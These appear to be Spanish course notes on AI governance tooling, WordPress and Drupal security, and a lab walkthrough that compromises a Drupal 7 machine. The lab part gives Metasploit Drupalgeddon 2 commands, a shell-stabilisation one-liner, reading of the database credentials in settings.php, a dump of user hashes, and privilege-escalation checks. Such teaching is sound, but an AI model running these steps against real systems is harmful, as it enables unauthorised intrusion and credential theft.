**iWarden: monitorización y gobernanza de IA en entornos empresariales**

Carlos presenta la herramienta que acaba de construir para responder a uno de los problemas más urgentes que le están planteando grandes bancos: saber qué hacen sus empleados (y sus agentes) cuando interactúan con la IA, qué datos les mandan y qué recursos consumen.

- **La idea clave:** cuando una empresa tiene 200 agentes en producción, es manejable saber qué hace cada uno; cuando tiene 10000, es imposible sin una herramienta de monitorización — ese es exactamente el problema que BBVA y Banco Santander están intentando resolver ahora mismo
    
- iWarden intercepta todos los prompts que llegan a la API (desde la app desktop, desde cursor, desde VS Code, desde cualquier cliente), analiza si contienen datos confidenciales (DNIs, claves, información sensible), los bloquea si es necesario y los registra con su nivel de confidencialidad y el motivo del bloqueo
    
- También calcula tokens de entrada y salida por prompt, acumula costes por equipo y detecta si el modelo elegido está sobredimensionado para la tarea — si alguien usa Fable 5 para algo que haría Haiku, el sistema lo detecta y puede recalibrar automáticamente el modelo
    
- **La metáfora útil:** usar Claude Opus para escribir un email de dos líneas es como usar una bomba atómica para hacer un agujero de un palmo en el jardín — la herramienta correcta para el tamaño de tarea correcto es el principio de optimización de costes de IA
    
- Los guardaraíles son las reglas de firewall de la IA: restricciones definidas en el system prompt o en la configuración del agente que impiden que la IA haga cosas fuera de su scope (hacer la lista de la compra en una herramienta de programación corporativa, por ejemplo)
    
- **La idea clave sobre salidas profesionales:** los perfiles que están buscando BBVA y Santander ahora mismo son expertos en seguridad de agentes de LLMs — que sepan crear agentes de automatización, securizarlos, definir guardaraíles, gestionar la gobernanza del dato y controlar la confidencialidad, integridad y disponibilidad de la información que maneja la IA

**Qué es un CMS y la guerra WordPress vs. Drupal**

Un CMS (Content Management System) es una colección de recursos web prehecha que permite construir páginas web visualmente, por bloques, sin necesidad de programar desde cero. Los principales son WordPress, Drupal, Magento y Shopify.

- WordPress funciona como un corcho sobre el que se añaden dos tipos de piezas: los **temas** (templates visuales que definen la estructura y apariencia de la página) y los **plugins** (funcionalidades adicionales como galerías, carritos de compra, formularios, analíticas, etc.)
    
- **La idea clave:** WordPress, Drupal y cualquier CMS son PHP sobre Linux con Apache (o Nginx) — cuando los vemos en un escaneo, ya sabemos el stack tecnológico antes de tocar nada
    
- La historia de por qué WordPress domina el mercado tiene un nombre: **Drupalgeddon**. Drupal era más popular que WordPress hasta que sacó una versión con una vulnerabilidad de RCE sin interacción (CVSS 9.5) que comprometió millones de páginas. Al intentar parchearla de urgencia, el propio parche generó **Drupalgeddon 2**, con CVSS 10 — el máximo posible. La gestión del incidente fue tan desastrosa que la imagen de marca de Drupal no se recuperó, y todo el mercado migró a WordPress
    
- **La idea clave sobre la cadena de suministro:** WordPress expone tres superficies de ataque independientes entre sí — el core (la instalación base), los temas y los plugins; una vulnerabilidad en el plugin de Pikachu bailón que tiene 1 millón de descargas afecta a todos esos sitios independientemente de su versión de WordPress o de su tema; esto es exactamente lo que NIS2 y otras normativas llaman cadena de proveedores

**WPScan: escáner específico de WordPress y el valor del API token**

WPScan es a WordPress lo que Nmap es a los puertos: un escáner especializado que solo tiene sentido lanzar contra un WordPress real.

bash

```bash
# Sin API token (solo escanea el core):
wpscan --url https://objetivo.com

# Con API token (escanea core + plugins con CVEs asociados):
wpscan --url https://objetivo.com --api-token=TOKEN
```

- **La idea clave:** sin el API token, WPScan solo analiza el core de WordPress (la instalación base) y devuelve información muy básica — versión de WordPress, tema activo, fichero readme.html, XML-RPC. Con el API token, consulta la base de datos propia de WPScan con todas las versiones de todos los plugins y sus vulnerabilidades asociadas; ahí es donde está el valor real del escaneo
    
- Registrarse en [wpscanner.com](http://wpscanner.com/) para obtener el token es gratuito y lleva dos minutos
    
- La demostración sobre la web de CiberSec revela docenas de vulnerabilidades en plugins, casi todas marcadas como authenticated — lo que significa que para explotarlas hay que tener un usuario autenticado en la plataforma. Si la web no tiene registro público ni panel de login accesible, esas vulnerabilidades son potenciales pero no explotables en la práctica
    
- **La idea clave sobre el análisis crítico:** reportar todas las vulnerabilidades que saca WPScan sin filtrar demuestra que no se entiende el contexto; un auditor que sabe diferencia las que son explotables de las que no, y argumenta por qué descarta cada una, demuestra un nivel de criterio muy superior al que simplemente pega el output del escáner en el informe

**Reconocimiento sobre la máquina Drupal: metodología paso a paso**

La máquina objetivo tiene abiertos los puertos 22 (SSH) y 80 (HTTP). El TTL del ping es 64, confirmando Linux. El Nmap con -sVC revela Apache 2.2.22, MySQL, PHP y la versión de Drupal en el banner.

- El fichero /robots.txt es una fuente de información valiosa: diseñado para decirle a los crawlers de Google qué no indexar, acaba revelando rutas que el desarrollador preferiría mantener ocultas — directorios de módulos, scripts, temas, ficheros de instalación y rutas de administración como /admin, /user/login, /user/register
    
- Con esa información ya se sabe que hay un panel de registro público, un panel de login y una ruta de admin

- El formulario de login se prueba con una comilla simple para detectar SQL Injection; en este caso no da resultado pero es parte del checklist estándar
    
- El fuzzing de directorios con dirsearch o gobuster se lanza en paralelo mientras se sigue explorando la web manualmente, para no perder tiempo esperando

**Explotación de Drupalgeddon 2 con Metasploit**

Confirmada la versión de Drupal 7 y sabiendo que Drupalgeddon 2 afecta a versiones 7.0 a 7.58, se busca el exploit en Metasploit.

bash

```bash
msfconsole
search drupal
use exploit/multi/http/drupal_drupageddon2
show options
set RHOSTS 10.0.2.17
set RPORT 80
run
```

- **La idea clave sobre cómo funciona un exploit:** un exploit es el contenedor (la caja), el payload es la carga útil (lo que va dentro y ejecuta la acción), y el tipo de red (TCP, HTTP) es el mensajero que lo transporta; para que el ataque funcione, RHOST y RPORT deben apuntar exactamente al servicio vulnerable — si la vulnerabilidad está en /user/register y se lanza contra /admin, el exploit no tiene efecto
    
- Metasploit autoconfigura un handler (equivalente a un netcat en escucha) con LHOST y LPORT propios, y devuelve una sesión de **Meterpreter** — la shell propia de Metasploit, que tiene comandos diferentes a bash y no responde a id, ifconfig ni los comandos habituales de Linux
    
- Para salir de Meterpreter y obtener una shell estándar se usa shell, y para estabilizarla Python 3:
    

bash

```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- **La idea clave sobre por qué Carlos no le gusta Metasploit:** la comodidad de run y que todo funcione solo elimina el aprendizaje — conseguir una reverse shell manualmente (subiendo una webshell, poniendo netcat en escucha, estabilizando con Python) construye comprensión real del proceso; Metasploit lo oculta todo detrás de una abstracción

**Post-explotación: ficheros de configuración y credenciales de base de datos**

Ya dentro como www-data, el objetivo inmediato es el fichero de configuración de Drupal, que siempre existe y siempre contiene las credenciales de la base de datos en texto claro.

bash

```bash
cd /var/www/
ls
cd drupal
cat sites/default/settings.php
```

- **La idea clave:** todos los CMS necesitan un fichero de configuración para conectar sus componentes (web, base de datos, caché, correo); ese fichero siempre contiene credenciales; siempre está en una ruta predecible según el CMS (sites/default/settings.php en Drupal, wp-config.php en WordPress, configuration.php en Joomla); encontrarlo es el primer movimiento tras conseguir acceso como usuario de servicio web
    
- Con las credenciales extraídas se accede directamente a MySQL desde dentro del servidor:
    

bash

```bash
mysql -u DBUSER -p
show databases;
use drupaldb;
show tables;
select * from users;
```

- La tabla de usuarios devuelve nombres de usuario (admin, fred) y sus hashes de contraseña — hashes de Drupal 7 con un formato específico que hay que identificar antes de intentar romperlos con hashcat o john
    
- **La idea clave sobre los siguientes pasos:** mientras los hashes se intentan romper, se exploran las vías clásicas de escalada de privilegios ya vistas en sesiones anteriores: sudo -l para ver si el usuario actual puede ejecutar algo como root, búsqueda de binarios SUID con find / -perm -4000 2>/dev/null, y revisión de cronjobs y ficheros con permisos incorrectos
